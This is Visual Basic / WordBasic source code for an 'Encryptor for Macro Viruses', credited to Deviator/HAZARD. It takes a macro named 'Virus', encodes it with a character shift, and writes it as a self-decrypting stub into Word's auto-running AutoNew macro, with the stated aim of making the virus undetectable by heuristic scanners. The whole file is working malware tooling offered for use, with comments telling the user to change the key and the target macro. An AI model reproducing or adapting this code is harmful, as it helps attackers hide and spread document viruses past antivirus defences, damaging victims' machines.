Attribute VB_Name = "Encryptor"

' Encryptor for Macro Viruses
' Makes virus undetectable by heuristics !
' By Deviator/HAZARD

Public Sub MAIN()
Dim Key
Dim Dest$
Dim A$
Dim M$
Dim z$
Dim i
Dim b

' Change key to something different
Key = 15
' Change destination macro
Dest$ = "AutoNew"

WordBasic.ToolsMacro Name:="Virus", Show:=1, Edit:=1
WordBasic.EditSelectAll: A$ = WordBasic.[Selection$]()
WordBasic.DocClose 2
WordBasic.ToolsMacro Name:=Dest$, Show:=1, Edit:=1
WordBasic.EditSelectAll
WordBasic.EditCut
M$ = Chr(13) + Chr(10)
WordBasic.Insert "Sub Main" + M$
WordBasic.Insert "A$ = " + Chr(34)
z$ = ""
For i = 1 To Len(A$)
b = Asc(Mid(A$, i, 1)) + Key
If b > 255 Then b = b - 255
z$ = z$ + Chr(b)
Next i
WordBasic.Insert (z$) + Chr(34) + M$
WordBasic.Insert "z$ = " + Chr(34) + Chr(34) + M$
WordBasic.Insert "For i = 1 to Len(A$)" + M$
WordBasic.Insert "b = Asc(Mid$(a$, i, 1)) -" + Str(Key) + M$
WordBasic.Insert "z$ = z$ + Chr$(b)" + M$
WordBasic.Insert "Next i" + M$
WordBasic.Insert "ToolsMacro .Name = " + Chr(34) + "Temp" + Chr(34) + ",.show = 1,.edit" + M$
WordBasic.Insert "EditSelectAll:EditCut" + M$
WordBasic.Insert "Insert z$" + M$
WordBasic.Insert "DocClose 1" + M$
WordBasic.Insert "Temp" + M$
WordBasic.Insert "ToolsMacro .Name = " + Chr(34) + "Temp" + Chr(34) + ",.show = 1 ,.delete" + M$
WordBasic.Insert "End Sub" + M$
WordBasic.DocClose 1
WordBasic.MsgBox "Encrypted virus created !" + M$ + "Look in " + Dest$ + " macro.", "Completed", 16

End Sub
